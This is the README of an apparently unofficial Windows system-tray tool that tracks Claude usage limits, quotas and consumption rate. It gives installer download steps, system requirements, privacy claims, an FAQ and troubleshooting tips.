💡 Overview

This tool helps you monitor your interaction limits with Claude. Many users hit usage caps during long work sessions. This application sits in your Windows system tray to show your current status, weekly limits, and total usage. It alerts you before you run out of messages so you can plan your work hours effectively.

⚙️ Key Features

  • Live Tray Icon: See your usage status at a glance from your taskbar.
  • Dashboard View: Open a simple window to view your daily and weekly quotas.
  • Usage Alerts: Receive notifications when you approach your limit.
  • Session Context: Track your volume per individual chat session.
  • Burn-rate Tracking: Monitor how fast you consume your allowed message credit.

🚀 Installation Guide

Follow these steps to install the application on your Windows computer:

  1. Visit the release page to find the latest version.
  2. Look for the file ending in .exe under the Assets section.
  3. Click the filename to start the download.
  4. Once the download completes, locate the file in your Downloads folder.
  5. Double-click the file to begin the setup process.
  6. Follow the on-screen instructions provided by the installer.

💻 System Requirements

This application works on any standard computer running Windows 10 or Windows 11. Ensure you have the following:

  • A stable internet connection to fetch usage data.
  • At least 50 MB of free storage space.
  • A valid Claude account that you use through your browser.

🛡️ Privacy and Safety

Your data stays local to your computer. The application tracks your interaction counts and timing. It does not record the content of your messages. It only observes the metadata necessary to calculate your remaining usage limits. The project is open source, which allows users to audit the code to verify these claims.

❓ Frequently Asked Questions

Does this app need my API keys? No. The app works by identifying patterns in your interaction data directly from your standard user session.

How do I stop the app? Right-click the icon in your system tray and select Exit.

Is this official software? No. This is a community project created to fill the need for better usage visibility.

🛠️ Troubleshooting

If the application fails to start, ensure your Windows desktop environment is fully updated. If the tray icon remains grey, verify that you are logged into your Claude account in your default web browser. Refreshing your browser tab often resolves connectivity issues.
